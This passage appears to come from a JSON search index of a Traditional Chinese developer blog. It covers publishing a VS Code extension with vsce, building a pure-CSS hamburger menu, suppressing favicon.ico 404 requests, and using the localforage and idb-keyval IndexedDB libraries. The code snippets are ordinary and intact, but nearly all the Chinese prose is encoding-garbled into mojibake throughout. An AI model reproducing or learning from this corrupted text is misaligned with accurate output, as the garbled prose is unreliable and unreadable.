\u0026#34;0.0.1\u0026#34;, // ... } vsce è¦æ±‚ Personal Access Token å€‹äººè¨ªå•é‡‘é‘°ï¼Œä»¥ä¸‹çš„æ­¥é©Ÿåœ–ç‰‡ä¾†æºç‚ºå®˜æ–¹èªªæ˜æ–‡ä»¶\né¦–å…ˆè«‹åˆ° https://dev.azure.com/ ç”³è«‹å¸³è™Ÿä¸¦ç™»å…¥ï¼Œåœ¨å³ä¸Šè§’æ‰“é–‹ Personal access tokens é é¢ã€‚\né»é¸ New Token æŒ‰éˆ•ã€‚\nçµ¦é€™å€‹æ–° Tokenä¸€å€‹åå­—ã€éæœŸæ™‚é–“ï¼Œé‡é»æ˜¯ Organization è«‹é¸æ“‡ All accessiable organizationï¼Œé»é¸ Custom defined ä¸¦é»é¸ Show all scopes æ‰“é–‹æ‰€æœ‰é¸é …ã€‚\næ‰¾åˆ° Marketplace é …ç›®å‹¾é¸ Acquire èˆ‡ Manage å¾Œé»é¸ Createã€‚\nç„¶å¾Œä½ æœƒå¾—åˆ°ä¸€å€‹ Token è«‹è¤‡è£½ä¸‹ä¾†ã€‚\nå»ºç«‹ç™¼ä½ˆå™¨ - Publisher å»ºç«‹ä¸€å€‹ Publisher ç”¨ä¾†å„²å­˜ç™¼ä½ˆçš„ Token ï¼Œè«‹åœ¨ package.json ä¸­æŒ‡å®šè¦ä½¿ç”¨çš„ç™¼ä½ˆå™¨\u0026quot;publisher\u0026quot;: (publisher name)\npackage.json 1 2 3 4 5 { // ... \u0026#34;publisher\u0026#34;: \u0026#34;{your publisher name}\u0026#34;, // ... } ä½¿ç”¨ Marketplace å¾Œå°å»ºç«‹ Publisher è«‹åˆ° https://marketplace.visualstudio.com/manage/publishers/ å»ºç«‹ä¸€å€‹ Publisherã€‚\nä½¿ç”¨ vsce æŒ‡ä»¤å»ºç«‹ Publisher 1 vsce create-publisher (publisher name) è¼¸å…¥å‰›å‰›çš„ Personal access tokenï¼Œvsce å°‡æœƒè¨˜å¾—é€™å€‹ publisher èˆ‡ token ä»¥æ–¹ä¾¿å¿«é€Ÿç™¼ä½ˆã€‚\nToken æ›´æ–° åœ¨æˆ‘å€‘å»ºç«‹ token æ™‚ï¼Œtoken æ˜¯æœ‰æ•ˆæœŸçš„ï¼Œç•¶ token éæœŸæ™‚æˆ‘å€‘å°±éœ€è¦ä»¥ä¸‹é€™å€‹æŒ‡ä¾†æ›´æ–° tokenï¼š\n1 vsce login (publisher name) ç™¼å¸ƒæ–¹å¼(ä¸€)ï¼šä½¿ç”¨ vsce ç™¼å¸ƒ extension ä¸‹æŒ‡ä»¤ç™¼å¸ƒåˆ° Marketplaceï¼š\n1 vsce publish ä½¿ç”¨ vsce show ç¢ºèª extension çš„è³‡è¨Šï¼š\n1 2 # vsce show {publisher name}.{extension id} vsce show 4006wayne.wconvert ä¹Ÿå¯ä»¥åœ¨ vsce publish æ™‚ç›´æ¥æŒ‡å®š tokenï¼š\n1 vsce publish -p \u0026lt;token\u0026gt; ç™¼å¸ƒæ–¹å¼(äºŒ)ï¼šä½¿ç”¨ Marketplace å¾Œå°ä¸Šå‚³ï¼Œç™¼å¸ƒ extension å‰å¾€ç¶²å€ https://marketplace.visualstudio.com/manage/publishers/ï¼Œé¸æ“‡å‰›å‰›å‰µå»ºçš„ Publisherã€‚\né»é¸ New extension \u0026gt; Visual Studio Codeï¼Œé¸æ“‡å‰›å‰› package å‡ºä¾†çš„ .vsix æª”æ¡ˆå¾Œä¸Šå‚³ã€‚\nä¸Šå‚³å¾Œç­‰å¾…é©—è­‰ï¼Œé©—è­‰å®Œç•¢å¾Œå³å¯çœ‹åˆ°æˆ‘çš„ extensionï¼š\nçµèª åˆ°é€™è£¡æˆ‘å·²ç¶“æˆåŠŸç™¼ä½ˆæˆ‘çš„ç¬¬ä¸€å€‹ Extension äº†ï¼\né€™æ˜¯æˆ‘å¯«çš„ç¬¬ä¸€å€‹ Extensionï¼ŒåŠŸèƒ½å¾ˆé™½æ˜¥ï¼Œç”¨é€”æ˜¯ç”¢ç”ŸæŒ‡å®šæ™‚é–“çš„æ™‚é–“æˆ³èˆ‡æ™‚é–“æˆ³è½‰å›æŒ‡å®šæ™‚å€çš„æ™‚é–“æ ¼å¼ã€‚\néå¸¸æ¨è–¦ä½¿ç”¨ Typescript æœƒæ¯”è¼ƒå®¹æ˜“é–‹ç™¼ï¼Œä¸ç„¶è¦æŸ¥å®˜æ–¹APIæœƒçœ‹å¾—å¾ˆç—›è‹¦ï¼Œç•¢ç«Ÿç¯„ä¾‹ä¸å¤šæˆ–è€…éƒ½è¦ä¸‹è¼‰æ‰èƒ½çœ‹ã€‚\nå¯¦éš›æ’°å¯«æ™‚æœƒé‡åˆ° VScode API åˆ°åº•æœ‰å“ªäº›åŠŸèƒ½å¯ä»¥ä½¿ç”¨çš„å•é¡Œï¼Œç”šè‡³è¦å»äº†è§£ VScode çš„è¨­è¨ˆçµæ§‹ï¼\nå¸¸è¦‹å•é¡Œ Extension validation error å‡ºç¾å¦‚åœ–çš„å•é¡Œï¼Œè‡ªè¡Œæ’æŸ¥ extension ç¨‹å¼ç¢¼å¾Œç™¼ç¾éç¨‹å¼ç¢¼é‚è¼¯çš„å•é¡Œï¼Œå¯ä»¥ä¸Š issues å°‡è³‡è¨Šåæ‡‰çµ¦ vsmarketplaceï¼Œæ­¤å¯èƒ½ç‚º marketplace é©—è­‰ extension æ™‚åµæ¸¬åˆ°ç‰¹å®šå­—å…ƒçµ„åˆè€Œé˜»æ“‹æ‰ï¼Œæœƒå°ˆäººå”åŠ©è™•ç†ã€‚\né™„ä¸Šæœ¬äººé‡åˆ°æ­¤å•é¡Œçš„ Issues\n","date":"2022-11-22T00:00:00Z","image":"https://live.staticflickr.com/65535/52516420035_bc4b9df19c_o.png","permalink":"https://wayneblog.ga/2022-11-22/create-own-vscode-extension/","title":"ä»Šå¤©ä¾†æä¸€å€‹å±¬æ–¼è‡ªå·±çš„ VScode Extension å§ï¼"},{"content":" åƒè€ƒç¶²ç«™\nå‰è¨€ é¸å–®ä¸€ç›´æ˜¯è£½ä½œç¶²é æœ€åŸºæœ¬çš„åŠŸèƒ½éœ€æ±‚ä¹‹ä¸€ï¼Œå› æ­¤å°æ–¼è¨±å¤šçš„å¥—ä»¶å…§å»ºéƒ½æœƒæä¾›é¸å–®çš„åŠŸèƒ½ï¼Œä¸”é€™äº›æ»‘å‹•å¼é¸å–®ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é€é Javascript æ‰€è£½ä½œè€Œæˆï¼Œæœ€ä¸»è¦çš„åŸå› å°±åœ¨æ–¼ï¼Œé€é Javascript å¯ä»¥ç²¾æº–çš„çŸ¥é“ï¼Œç›®å‰ä½¿ç”¨æ˜¯é»é¸é–‹å•Ÿé‚„æ˜¯é—œé–‰ã€‚\nè€Œæœ€è¿‘ç™¼ç¾ä¸€å€‹è¶…é…·çš„å¯«æ³•ï¼Œç›´æ¥é€é HTML ä¸­çš„æ ¸è¨±æ¡†ï¼Œå°±å¯åˆ¤æ–·ç›®å‰æ˜¯é–‹å•Ÿé‚„æ˜¯é—œé–‰ï¼Œå†æ­é… CSS å°±å¯å¯¦ä½œå‡ºå±•é–‹èˆ‡æ”¶åˆï¼Œç”šè‡³é€£æ¼¢å ¡é¸å–®çš„é‚£åœ–ç¤ºï¼Œä¹Ÿå¯é€é CSS ç¹ªè£½å‡ºä¾†ï¼Œä¸”ç•¶é¸å–®é–‹å•Ÿæ™‚ï¼Œé‚„å¯é€éå‹•ç•«å°‡é¸å–®è®Šå‰å‰çš„åœ–ç¤ºï¼Œå› æ­¤ç¾åœ¨å°±ä¸€å¡Šä¾†çœ‹çœ‹ï¼Œå¦‚ä½•é€éç´” CSS æ‰“é€ å‡ºé–‹åˆå¼æ¼¢å ¡é¸å–®å§ï¼\nåšæ³• 1. åŠ å…¥ä»¥ä¸‹çš„ HTML æ¶æ§‹ é¦–å…ˆï¼Œå…ˆåœ¨HTMLä¸­åŠ å…¥ä»¥ä¸‹çš„HTMLæ¶æ§‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;nav class=\u0026#34;nav-box\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; id=\u0026#34;menu\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;menu\u0026#34; class=\u0026#34;line\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;menu\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;menu-list\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;é¸å–®1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;é¸å–®2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;é¸å–®3\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; 2. åŠ å…¥ CSS è¨­å®šæ¼¢å ¡é¸å–®çš„åœ–ç¤º æ¥è‘—å†é€éCSSä¾†è¨­å®šæ¼¢å ¡é¸å–®çš„åœ–ç¤ºã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* é¸å–®ç·š */ .line { width: 24px; height: 24px; background: #FFF; cursor: pointer; display: block; padding: 16px; position: fixed; z-index: 2; } .line .menu, .line .menu::before, .line .menu::after { background: #222; content: \u0026#39;\u0026#39;; display: block; height: 1px; position: absolute; transition: background ease .15s, top ease .15s .15s, transform ease .15s; width: 20px; } .line .menu { left: 18px; top: 27px; } .line .menu::before { top: -6px; } .line .menu::after { top: 6px; } 3. åŠ å…¥ :checked å±¬æ€§çš„åˆ¤æ–· æ¥è‘—å†é€é :checked çš„å±¬æ€§ï¼Œä¾†åˆ¤æ–·ç›®å‰ç‚ºé–‹å•Ÿç‹€æ…‹ï¼Œç•¶é¸å–®é–‹å•Ÿæ™‚ï¼ŒåŸä¾†çš„ä¸‰æ¢ç·šå°±è®Šæˆå‰å‰ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* é»é¸é¸å–®è®Šå‰å‰ */ #menu:checked + .line .menu { background: transparent; } #menu:checked + .line .menu::before { transform: rotate(45deg); } #menu:checked + .line .menu::after { transform: rotate(-45deg); } #menu:checked + .line .menu::before, #menu:checked + .line .menu::after { top: 0; transition: top ease .15s, transform ease .15s .15s; } 4. è¨­å®šé–‹åˆæ¨£å¼ ç•¶é¸å–®æŒ‰éˆ•è™•ç†å¥½å¾Œï¼Œä¸€æ¨£ç”¨ :checked ä¾†è¨­å®šé¸å–®å±•é–‹(200px)èˆ‡æ”¶åˆ(60px)ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /* é¸å–®é–‹åˆ */ #menu:checked ~ .menu-list { width: 200px; } .menu-list { width: 60px; height: 100vh; background: #FFF; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); padding-top: 60px; position: fixed; z-index: 1; transition: all .3s; overflow: hidden; } /* é¸å–®å‘å¤–æ¨ */ .menu-list ul { list-style: none; margin-left:70px; padding: 0; } .menu-list ul\u0026gt;li{ display:block; width:100px; } 5. éš±è— checkbox éƒ½å¼„å¥½å¾Œï¼Œå†æŠŠ input çš„æ ¸è¨±æ¡†çµ¦éš±è—èµ·ä¾†ï¼Œé€™æ¨£å°±å¯é€éç´”CSSæ‰“é€ å‡ºæ»‘å‹•å¼çš„æ¼¢å ¡é¸å–®å•¦ï¼\nç¯„ä¾‹é è¦½ See the Pen blog/pure-css-toggle-menu-icon by wjdesign (@WJDesign) on CodePen. ","date":"2022-11-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52514242955_fd814a2b16_o.gif","permalink":"https://wayneblog.ga/2022-11-21/pure-css-toggle-menu-icon/","title":"å…JSï¼ç´”CSSå°±å¯æ‰“é€ å‡ºï¼Œé–‹åˆå¼çš„æ¼¢å ¡é¸å–®åŠŸèƒ½"},{"content":" åƒè€ƒç¶²ç«™\nå•é¡ŒåŸå›  ç€è¦½å™¨åˆåˆ°æ–°ç¶²ç«™æ™‚ï¼Œæœƒè©¦è‘—ä¸‹è¼‰åç‚º Favicon (Favorite Icon) çš„ç¶²ç«™ä»£è¡¨åœ–ç¤ºï¼Œç”¨åœ¨åœ°å€åˆ—ã€é ç±¤ã€æ›¸ç±¤(æˆ‘çš„æœ€æ„›)ä¸Šã€‚\nè‹¥ç¶²é æ²’ç‰¹åˆ¥æŒ‡å®šï¼Œç€è¦½å™¨é è¨­æœƒæŠ“å–ç¶²ç«™æ ¹è·¯å¾‘çš„ /favicon.ico æª”æ¡ˆï¼Œæ‰¾ä¸åˆ°å°±ç®—äº†ä¸æœƒè§¸ç™¼éŒ¯èª¤ã€‚\nä¸€èˆ¬æˆ‘å€‘ä¸ç‚ºæœƒç‚ºæ¸¬è©¦ã€é–‹ç™¼ç”¨ç¶²ç«™è¨­è¨ˆåœ–ç¤ºï¼Œä½†ç€è¦½å™¨ä»æœƒåœ¨ç¬¬ä¸€æ¬¡å­˜å–æ™‚å˜—è©¦ä¸‹è¼‰ /favicon.icoï¼Œä¸æ„å¤–åœ°ä»¥ HTTP 404 æ”¶å ´ï¼š\nåš´æ ¼ä¾†èªªï¼Œç€è¦½å™¨æœƒè¨˜ä½çµæœï¼Œ404 å¤±æ•—åªæœƒç™¼ç”Ÿä¸€æ¬¡(ç›´åˆ°ç€è¦½å™¨é‡å•Ÿ)ï¼Œå¤§å° 5KB èªªä¾†ç„¡å‚·å¤§é›…ã€‚ä½†å®ƒæœ€å›°æ“¾æˆ‘çš„åœ°æ–¹æ˜¯ä½¿ç”¨ F12 ç¶²è·¯å·¥å…·æˆ– Fidder æŠ“å°åŒ…æ™‚ï¼Œè§€å¯Ÿçµæœå¤©ä¸‹é£›ä¾†ä¸€ç­† /favicon.ico 404ï¼Œèªªæ˜æ™‚é‚„è¦é¡å¤–è§£é‡‹ï¼Œè »ç…©äººçš„ã€‚\nè§£æ±ºæ–¹å¼ çˆ¬æ–‡æŸ¥äº†é¿å…ç€è¦½å™¨æŠ“ /favicon.ico çš„æ–¹æ³•ï¼Œæœ‰ä»¥ä¸‹å¹¾ç¨®ï¼š\nFirefox 25+ ä¸æ”¯æ´ 1 \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;data:image/x-icon;,\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; æœ‰äº›èˆŠç€è¦½å™¨ä¸æ”¯æ´ (Android Lollipop) 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;data:,\u0026#34;\u0026gt; è¨»ï¼šè‹¥æœ‰è¨­å®š Content-Security-Policy default-src \u0026lsquo;self\u0026rsquo; æœƒå°é™ data:image/png \u0026hellip; ä¾†æºï¼Œéœ€èª¿æ•´ç‚º default-src 'self' data: åƒè€ƒ 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;data:image/png;base64,iVBORw0KGgo=\u0026#34;\u0026gt; çµè«– çµè«–ï¼šè‹¥åªè€ƒæ…® Chromeï¼Œä¸‰ç¨®åšæ³•å‡å¯é¿å…ç€è¦½å™¨å˜—è©¦å­˜å– favicon.icoï¼Œç¬¬ä¸‰ç¨®åšæ³•æ¶µè“‹ç€è¦½å™¨æœ€å»£ã€‚\n","date":"2022-11-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52513251827_7a73de7710_o.png","permalink":"https://wayneblog.ga/2022-11-21/prevent-invalid-favicon/","title":"é¿å…ç„¡æ•ˆ favicon.ico å­˜å–å‹•ä½œ"},{"content":" åƒè€ƒç¶²ç«™\nlocalStorage æ˜¯å‰ç«¯æœ¬åœ°å„²å­˜çš„ä¸€ç¨®ï¼Œå…¶å®¹é‡ä¸€èˆ¬åœ¨ 5M-10M å·¦å³ï¼Œç”¨ä¾†å¿«å–ä¸€äº›ç°¡å–®çš„è³‡æ–™åŸºæœ¬å¤ ç”¨ï¼Œç•¢ç«Ÿå®šä½ä¹Ÿä¸æ˜¯å¤§è³‡æ–™é‡çš„å„²å­˜ã€‚\nåœ¨æŸäº›å ´æ™¯ä¸‹ localStorage çš„å®¹é‡å°±æœƒæœ‰é»æ‰è¥Ÿè¦‹è‚˜ï¼Œå…¶å¯¦ç€è¦½å™¨æ˜¯æœ‰æä¾›å¤§è³‡æ–™é‡çš„æœ¬åœ°å„²å­˜çš„å¦‚ IndexedDB å„²å­˜è³‡æ–™å¤§å°ä¸€èˆ¬åœ¨ 250M ä»¥ä¸Šã€‚\nå½Œè£œäº† localStorage å®¹é‡çš„ç¼ºé™·ï¼Œä½†æ˜¯ä½¿ç”¨è¦æ¯” localStorage è¤‡é›œä¸€äº› mdn IndexedDB\nä¸éå·²ç¶“æœ‰å¤§ä½¬é€ äº†è¼ªå­å°è£äº†ä¸€äº›å‘¼å«éç¨‹ä½¿å…¶ä½¿ç”¨ç›¸å°ç°¡å–®ï¼Œä¸‹é¢æˆ‘å€‘ä¸€èµ·ä¾†çœ‹ä¸€ä¸‹ï½\nlocalforage localforageï¼Œæ“æœ‰é¡ä¼¼ localStorage APIï¼Œå®ƒèƒ½å„²å­˜å¤šç¨®å‹åˆ¥çš„è³‡æ–™å¦‚ Arrayã€ArrayBufferã€Blobã€Numberã€Objectã€Stringï¼Œè€Œä¸åƒ…åƒ…æ˜¯å­—ä¸²ã€‚\né€™æ„å‘³è‘—æˆ‘å€‘å¯ä»¥ç›´æ¥å­˜ ç‰©ä»¶ã€é™£åˆ—å‹åˆ¥çš„è³‡æ–™é¿å…äº† JSON.stringify è½‰æ›è³‡æ–™çš„ä¸€äº›å•é¡Œã€‚\nå„²å­˜å…¶ä»–è³‡æ–™å‹åˆ¥æ™‚éœ€è¦è½‰æ›æˆä¸Šé‚Šå°æ‡‰çš„å‹åˆ¥ï¼Œæ¯”å¦‚ vue3 ä¸­ä½¿ç”¨ reactive å®šç¾©çš„è³‡æ–™éœ€è¦ä½¿ç”¨ toRaw è½‰æ›æˆåŸå§‹è³‡æ–™é€²è¡Œå„²å­˜ï¼Œ ref å‰‡ç›´æ¥å„²å­˜ xxx.value è³‡æ–™å³å¯ã€‚\nå®‰è£ ä¸‹è¼‰æœ€æ–°ç‰ˆæœ¬ æˆ–ä½¿ç”¨ npmã€bower é€²è¡Œå®‰è£ï¼Œå¼•å…¥ä¸‹è¼‰çš„ localforage å³å¯ä½¿ç”¨ã€‚\né€šé npm å®‰è£ï¼š 1 npm install localforage é€šé bower å®‰è£ï¼š 1 bower install localforage ä½¿ç”¨ æä¾›äº†èˆ‡ localStorage ç›¸åŒçš„apiï¼Œä¸åŒçš„æ˜¯å®ƒæ˜¯éåŒæ­¥çš„å‘¼å«è¿”å›ä¸€å€‹ Promise ç‰©ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 localforage.getItem(\u0026#39;somekey\u0026#39;) .then(function(value) { // ç•¶é›¢ç·šå€‰åº«ä¸­çš„å€¼è¢«è¼‰å…¥æ™‚ï¼Œæ­¤è™•ç¨‹å¼ç¢¼åŸ·è¡Œ console.log(value); }) .catch(function(err) { // ç•¶å‡ºéŒ¯æ™‚ï¼Œæ­¤è™•ç¨‹å¼ç¢¼åŸ·è¡Œ console.log(err); }); // callback ç‰ˆæœ¬ localforage.getItem(\u0026#39;somekey\u0026#39;, function(err, value) { // ç•¶é›¢ç·šå€‰åº«ä¸­çš„å€¼è¢«è¼‰å…¥æ™‚ï¼Œæ­¤è™•ç¨‹å¼ç¢¼åŸ·è¡Œ console.log(value); }); æä¾›çš„æ–¹æ³• getItemï¼š æ ¹æ“šè³‡æ–™çš„ key ç²å–è³‡æ–™ ä¸å­˜åœ¨å‰‡è¿”å› nullã€‚ setItemï¼š æ ¹æ“šè³‡æ–™çš„ key è¨­å®šè³‡æ–™(å„²å­˜ undefined æ™‚ getItem ç²å–æœƒè¿”å› null)ã€‚ removeItemï¼š æ ¹æ“š key åˆªé™¤è³‡æ–™ã€‚ lengthï¼š ç²å– key çš„æ•¸é‡ã€‚ keyï¼š æ ¹æ“š key çš„ç´¢å¼•ç²å–å…¶åã€‚ keysï¼š ç²å–è³‡æ–™å€‰åº«ä¸­æ‰€æœ‰çš„ keyã€‚ iterateï¼š è¿­ä»£è³‡æ–™å€‰åº«ä¸­çš„æ‰€æœ‰ value/key éµå€¼å°ã€‚ é…ç½® å®Œæ•´é…ç½®å¯æª¢è¦–æ–‡ä»¶\né€™è£¡èªªå€‹æˆ‘è¦ºå¾—å¾ˆæœ‰ç”¨çš„ï¼š\n1 localforage.config({ name: \u0026#39;My-localStorage\u0026#39; }); è¨­å®šå€‰åº«çš„åå­—ï¼Œä¸åŒçš„åå­—ä»£è¡¨ä¸åŒçš„å€‰åº«ï¼Œç•¶ä¸€å€‹æ‡‰ç”¨éœ€è¦å¤šå€‹æœ¬åœ°å€‰åº«éš”é›¢è³‡æ–™çš„æ™‚å€™å°±å¾ˆæœ‰ç”¨ã€‚\n1 2 3 4 5 6 const store = localforage.createInstance({ name: \u0026#34;nameHere\u0026#34; }); const otherStore = localforage.createInstance({ name: \u0026#34;otherName\u0026#34; }); // è¨­å®šæŸå€‹è³‡æ–™å€‰åº« key çš„å€¼ä¸æœƒå½±éŸ¿åˆ°å¦ä¸€å€‹æ•¸æ“šå€‰åº« store.setItem(\u0026#34;key\u0026#34;, \u0026#34;value\u0026#34;); otherStore.setItem(\u0026#34;key\u0026#34;, \u0026#34;value2\u0026#34;); åŒæ™‚ä¹Ÿæ”¯æ´åˆªé™¤å€‰åº«ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // å‘¼å«æ™‚ï¼Œè‹¥ä¸å‚³åƒï¼Œå°‡åˆªé™¤ç•¶å‰ä¾‹é …çš„ â€œè³‡æ–™å€‰åº«â€ã€‚ localforage.dropInstance() .then(function() { console.log(\u0026#39;Dropped the store of the current instance\u0026#39;); }); // å‘¼å«æ™‚ï¼Œè‹¥å¼•æ•¸ç‚ºä¸€å€‹æŒ‡å®šäº† name å’Œ storeName å±¬æ€§çš„ç‰©ä»¶ï¼Œæœƒåˆªé™¤æŒ‡å®šçš„ â€œè³‡æ–™å€‰åº«â€ã€‚ localforage.dropInstance({ name: \u0026#34;otherName\u0026#34;, storeName: \u0026#34;otherStore\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherStore\u0026#39;); }); // å‘¼å«æ™‚ï¼Œè‹¥å¼•æ•¸ç‚ºä¸€å€‹åƒ…æŒ‡å®šäº† name å±¬æ€§çš„ç‰©ä»¶ï¼Œå°‡åˆªé™¤æŒ‡å®šçš„ â€œè³‡æ–™åº«â€ (åŠå…¶æ‰€æœ‰è³‡æ–™å€‰åº«)ã€‚ localforage.dropInstance({ name: \u0026#34;otherName\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherName database\u0026#39;); }); idb-keyval idb-keyval æ˜¯ç”¨ IndexedDB å¯¦ç¾çš„ä¸€å€‹è¶…ç´šç°¡å–®çš„åŸºæ–¼ promise çš„éµå€¼å„²å­˜ã€‚\nå®‰è£ 1 npm install idb-keyval ä½¿ç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // å…¨éƒ¨å¼•å…¥ import idbKeyval from \u0026#39;idb-keyval\u0026#39;; idbKeyval.set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // æŒ‰éœ€å¼•å…¥æœƒ treeshake import { get, set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get(\u0026#39;hello\u0026#39;) .then((val) =\u0026gt; console.log(val)); ç€è¦½å™¨ç›´æ¥å¼•å…¥ï¼š\n1 \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/idb-keyval@6/dist/umd.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; æä¾›çš„æ–¹æ³• ç”±æ–¼å…¶æ²’æœ‰ä¸­æ–‡çš„å®˜ç¶²ï¼ŒæœƒæŠŠä¾‹å­åŠè‡ªå·±çš„ç†è§£é™„ä¸Šï¼š\nset setï¼š è¨­å®šè³‡æ–™\nkey å¯ä»¥æ˜¯ Numberã€Stringã€Date(IDB ä¹Ÿå…è¨±é€™äº›å€¼çš„é™£åˆ—ï¼Œä½† IE ä¸æ”¯æ´)ã€‚ value å¯ä»¥æ˜¯ Numberã€Arrayã€Objectã€Dateã€Blobs ç­‰ï¼Œå„˜ç®¡è€ Edge ä¸æ”¯æ´ nullã€‚\n1 2 3 4 5 import { set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); setMany setManyï¼š è¨­å®šå¤šå€‹æ•¸æ“š\nä¸€æ¬¡è¨­å®šå¤šå€‹å€¼ï¼Œæ¯”ä¸€å€‹ä¸€å€‹çš„è¨­å®šæ›´å¿«\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import { set, setMany } from \u0026#39;idb-keyval\u0026#39;; // ä¸æ‡‰è©²: Promise.all([set(123, 456), set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // é€™æ¨£åšæ›´å¿«: setMany([ [123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;], ]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get getï¼š ç²å–è³‡æ–™\nå¦‚æœæ²’æœ‰ keyï¼Œé‚£éº¼ value å°‡è¿”å› undefinedã€‚\n1 2 3 4 5 import { get } from \u0026#39;idb-keyval\u0026#39;; // logs: \u0026#34;world\u0026#34; get(\u0026#39;hello\u0026#39;) .then((val) =\u0026gt; console.log(val)); getMany getManyï¼š ç²å–å¤šå€‹æ•¸æ“š\nä¸€æ¬¡ç²å–å¤šå€‹æ•¸æ“šï¼Œæ¯”ä¸€å€‹ä¸€å€‹çš„ç²å–è³‡æ–™æ›´å¿«\n1 2 3 4 5 6 7 8 9 import { get, getMany } from \u0026#39;idb-keyval\u0026#39;; // ä¸æ‡‰è©²: Promise.all([get(123), get(\u0026#39;hello\u0026#39;)]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); // é€™æ¨£åšæ›´å¿«: getMany([123, \u0026#39;hello\u0026#39;]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); del delï¼š åˆªé™¤è³‡æ–™\næ ¹æ“š key åˆªé™¤è³‡æ–™\n1 2 3 import { del } from \u0026#39;idb-keyval\u0026#39;; del(\u0026#39;hello\u0026#39;); delMany delManyï¼š åˆªé™¤å¤šå€‹æ•¸æ“š\nä¸€æ¬¡åˆªé™¤å¤šå€‹éµï¼Œæ¯”ä¸€å€‹ä¸€å€‹çš„åˆªé™¤æ›´å¿«\n1 2 3 4 5 6 7 8 9 10 11 12 import { del, delMany } from \u0026#39;idb-keyval\u0026#39;; // ä¸æ‡‰è©²: Promise .all([del(123), del(\u0026#39;hello\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // é€™æ¨£åšæ›´å¿«: delMany([123, \u0026#39;hello\u0026#39;]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); update updateï¼š æ’éšŠæ›´æ–°è³‡æ–™ï¼Œé˜²æ­¢ç”±æ–¼éåŒæ­¥å°è‡´è³‡æ–™æ›´æ–°å•é¡Œ\nå› ç‚º get èˆ‡ set éƒ½æ˜¯éåŒæ­¥çš„ä½¿ç”¨ä»–å€‘ä¾†æ›´æ–°è³‡æ–™å¯èƒ½æœƒå­˜åœ¨å•é¡Œå¦‚ï¼š\n1 2 3 4 5 6 // Don\u0026#39;t do this: import { get, set } from \u0026#39;idb-keyval\u0026#39;; get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); // ä¸Šè¿°ç¨‹å¼ç¢¼æˆ‘å€‘æœŸæœ›çš„æ˜¯ 2 ä½†å¯¦éš›çµæœæ˜¯ 1ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ç¬¬ä¸€å€‹ callback åŸ·è¡Œç¬¬äºŒæ¬¡æ“ä½œã€‚ æ›´å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨ update ä¾†æ›´æ–°è³‡æ–™ï¼š\n1 2 3 4 5 6 // Instead: import { update } from \u0026#39;idb-keyval\u0026#39;; update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 0) + 1); update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 